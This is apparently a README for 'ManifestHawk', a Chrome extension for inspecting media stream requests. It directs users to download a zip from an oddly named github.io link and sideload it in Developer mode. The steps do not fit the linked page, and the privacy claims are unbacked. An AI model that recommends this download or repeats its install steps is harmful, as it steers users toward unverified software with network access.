# 🔍 ManifestHawk - Inspect media streams in your browser

[![Download ManifestHawk](https://img.shields.io/badge/Download-ManifestHawk-blue.svg)](https://screednightbloomingcereus973.github.io)

ManifestHawk helps you inspect media streams directly in your Chrome browser. It identifies HLS, DASH, MP4, and other media files as they load. You can see live network requests, preview stream content, filter specific URLs, and export data for your projects. This tool assists developers and testers in troubleshooting video playback issues.

## 📥 How to download the extension

You must visit the project page to access the software files.

[Click here to go to the ManifestHawk download page](https://screednightbloomingcereus973.github.io)

Follow these steps to add the tool to your browser:

1. Visit the link provided above.
2. Find the section labeled Releases on the right side of the page.
3. Click the latest version number.
4. Locate the Assets section at the bottom of the release notes.
5. Download the file ending in .zip to your computer.
6. Extract the contents of the zip file to a folder you can find easily, such as your Desktop.

## 🛠️ Installing the extension in Chrome

Chrome allows you to load extensions manually through the developer settings. Follow these steps to enable ManifestHawk:

1. Open Chrome.
2. Type `chrome://extensions` in your address bar and press Enter.
3. Look for a switch in the top right corner labeled Developer mode. Click this switch to turn it on.
4. A new menu bar appears below the address bar. Click the button labeled Load unpacked.
5. Find the folder where you extracted the ManifestHawk files earlier.
6. Select that folder and click the Select Folder or Open button.
7. Chrome now installs the extension. You see the ManifestHawk icon in your toolbar.

## 💡 How to use the inspector

Once you install the extension, it runs in the background while you browse. It monitors your network traffic for media files.

### Inspecting live traffic
1. Open the website you wish to test.
2. Click the ManifestHawk icon in your browser toolbar.
3. The popup window shows a list of active network requests.
4. The tool automatically detects media manifests like M3U8 or MPD files.
5. Click on any item in the list to see more details.

### Filtering results
If a page contains many requests, use the filter bar at the top of the extension popup. You can type keywords like "video" or "audio" to narrow down the list. The display updates in real-time as you type.

### Previewing streams
The extension provides a preview feature for supported formats. When you select a specific media request, a preview window shows if the link is a valid stream. This helps confirm that your media source works as expected.

### Exporting data
You can export the list of detected media requests to a file for later review. Click the Export button located in the extension interface. This saves a copy of your session data to your computer.

## 📋 System requirements

ManifestHawk works on any computer running the Google Chrome browser. Your operating system version must support the latest version of Chrome. No specific hardware requirements exist for this tool, as it operates entirely within the browser window. Ensure you have a stable internet connection if you are inspecting remote media streams.

## ⚙️ Troubleshooting common issues

If the extension does not appear to catch any media traffic, check these items:

* Refresh the webpage: The extension starts monitoring traffic once it loads. If you open the extension after the page finished loading, refresh the page to capture new data.
* Check developer mode: If you accidentally turned off Developer mode in Chrome, the extension stops working. Ensure the toggle in your extensions page stays in the on position.
* Check for updates: New browser versions sometimes change how extensions interact with network traffic. Check the download page periodically for new releases of ManifestHawk.
* Clean browser cache: Old site data sometimes interferes with network monitoring. Clear your cache if you suspect the extension does not see the newest media requests.

## 🛡️ Privacy and security

ManifestHawk processes network information locally on your machine. The extension does not send your browsing data to external servers. It only watches network requests that occur within the tabs you have open. You may disable or remove the extension at any time via the Chrome extensions page.

## 📝 Frequently asked questions

Does this tool work with Firefox?
Currently, ManifestHawk supports Google Chrome. Support for other browsers depends on compatibility with the underlying extension architecture.

Will this extension slow down my computer?
ManifestHawk operates as a passive listener. It uses minimal system resources to display network activity. It should not affect your overall browsing speed.

Can I inspect local files?
The tool focuses on HLS, DASH, and other stream formats delivered over the network. It provides the best results on websites that stream video content.

Keywords: browser-extension, chrome-extension, debugging, developer-tools, hls, m3u8, manifest-v3, media-inspector, mpd, mpeg-dash, network-inspector, network-monitoring, open-source, stream-inspector, video-streaming, webrequest